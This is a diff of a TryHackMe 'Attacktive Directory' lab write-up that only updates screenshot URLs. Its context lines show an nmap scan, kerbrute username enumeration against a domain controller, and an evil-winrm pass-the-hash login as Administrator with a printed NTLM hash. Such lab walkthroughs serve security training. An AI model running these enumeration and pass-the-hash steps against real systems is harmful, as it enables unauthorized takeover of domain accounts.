@@ -2,7 +2,7 @@
 ```
 sudo nmap -sV -sC -O -p- -oN nmap.txt -Pn 10.10.186.109
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/AttacktiveDirectory/assets/1.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/main/AttacktiveDirectory/assets/1.png">
 
 A lot of open ports and the target appears to be a domain controller. This will most likely give us a lot of enumeration abilities.
 <br>
@@ -14,7 +14,7 @@ Let's add it to the /etc/hosts file and run kerbrute to enumerate usernames.
 ```
 ./kerbrute userenum --dc spookysec.local -d spookysec.local ~/tmp/users.txt
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/AttacktiveDirectory/assets/2.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/AttacktiveDirectory/assets/2.png">
 
 We notice backup, administrator and svc-admin as interesting accounts.
 <br>
@@ -87,7 +87,7 @@ Let's use it to connect with evil-winrm:
 ```
 evil-winrm  -i 10.10.186.109 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc 
 ```
-<img src="https://raw.githubusercontent.com/vbrunschot/TryHackMe/main/AttacktiveDirectory/assets/3.png">
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/AttacktiveDirectory/assets/3.png">
 
 
 
